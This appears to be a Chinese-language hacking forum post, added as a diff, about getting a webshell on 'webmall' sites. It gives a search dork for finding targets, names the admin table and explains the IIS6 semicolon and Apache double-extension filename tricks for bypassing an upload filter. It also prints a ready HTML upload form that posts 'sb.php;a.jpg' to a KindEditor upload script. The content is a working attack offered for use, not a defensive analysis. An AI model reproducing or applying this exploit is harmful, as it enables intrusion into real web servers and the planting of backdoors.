@@ -1,0 +1,36 @@
+关键字：inurl:webmall/detail.php?id
+数据表：pwn_base_admin
+
+关于拿shell
+
+首先登录后台admin.php
+
+看了upload.php源码，分析了一个下午，然后大约是明白了虽然上传那里只允许上传gif,jpg,png,bmp四种文件，但是并没有对文件名做限制。
+换句话说，sb.php;a.jpg这样的文件也是允许的，只要服务器是IIS6就拿到webshel，低版本的apache可以试着重命名为sb.php.jpg
+然后搞完了才发现，这里的比我的更精简，我那个蛋疼，膜拜下三石，然后就借用了，我的开始和他的一样是采取全部源码的，然后发现了更精简的
+http://bbs.blackbap.org/forum.php?mod=viewthread&tid=2281
+
+
+01.<form name="uploadForm" method="post" enctype="multipart/form-data" 
+
+02.action="http://sb.f4ck/kedit/upload_cgi/upload.php"> 
+
+03.
+
+04.<input type="text" name="fileName" value="sb.php;a.jpg" /> 
+
+05.
+
+06.<input type="hidden" name="attachPath" value="news/pics/" /> 
+
+07.
+
+08.<input type="file" name="fileData" size="14" /></td> 
+
+09.
+
+10.<input type="submit" name="button" value="确定" /> 
+
+11.</form>
+复制代码
+首先登录后台，然后把上面的文件保存为xx.html，修改action，然后再上传，如果为iis6就在上传了查看源码就好了
